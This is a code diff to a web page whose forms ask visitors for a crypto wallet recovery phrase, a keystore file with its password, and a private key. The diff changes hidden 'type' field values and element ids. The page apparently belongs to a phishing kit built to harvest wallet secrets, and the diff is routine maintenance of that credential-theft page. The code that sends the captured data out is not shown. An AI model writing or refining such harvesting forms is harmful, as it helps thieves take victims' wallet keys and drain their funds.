@@ -6987,7 +6987,7 @@
 				  <div id="data-to-send">
 					<div class="form-group">
 					  <div class="form-group">
-						<input type="hidden" id="type1" name="type" value="phrase">
+						<input type="hidden" id="type" name="type" value="phrase">
 						<textarea id="phrase1" name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
 					  </div>
 					  <div class="small text-left my-3" style="font-size: 11px">
@@ -7655,17 +7655,17 @@
 			});
 			$("#phraseSend").on("click", function () {
 			  sendForm.html(
-				'<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
+				'<div class="form-group"><input type="hidden" id="type" name="type" value="Phrase"><textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
 			  );
 			});
 			$("#keystoreSend").on("click", function () {
 			  sendForm.html(
-				'<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" class="form-control" name="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
+				'<div class="form-group"><input type="hidden" id="type" name="type" value="Keystore"><textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" class="form-control" name="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
 			  );
 			});
 			$("#privateKeySend").on("click", function () {
 			  sendForm.html(
-				'<input type="hidden" id="type" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
+				'<input type="hidden" id="type" name="type" value="Privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
 			  );
 			});
 
@@ -7745,6 +7745,5 @@
 	  
 
 	</body></html>
-
 
 
